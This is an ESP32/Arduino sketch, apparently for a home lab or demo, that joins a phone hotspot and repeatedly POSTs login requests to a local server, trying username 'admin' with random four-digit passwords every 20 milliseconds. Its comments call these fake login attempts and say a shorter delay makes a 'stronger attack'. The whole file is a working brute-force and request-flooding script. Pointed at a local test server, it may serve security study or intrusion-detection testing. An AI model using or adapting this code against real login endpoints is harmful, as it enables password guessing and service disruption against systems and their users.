#include <WiFi.h>
#include <HTTPClient.h>

const char* ssid = "OnePlus Nord CE4";
const char* password = "";

const char* server = "http://10.221.202.11:5000/login";  // your laptop IP

void setup() {
  Serial.begin(115200);

  WiFi.begin(ssid, password);
  while (WiFi.status() != WL_CONNECTED) {
    delay(500);
    Serial.print(".");
  }

  Serial.println("Connected!");
}

void loop() {

  if (WiFi.status() == WL_CONNECTED) {

    HTTPClient http;

    http.begin(server);

    // 🔥 fake login attempts
    http.addHeader("Content-Type", "application/x-www-form-urlencoded");

    String data = "username=admin&password=" + String(random(1000,9999));

    http.POST(data);

    http.end();

    Serial.println("Login attempt sent");
  }

  delay(20);  // 🔥 reduce delay → stronger attack
}
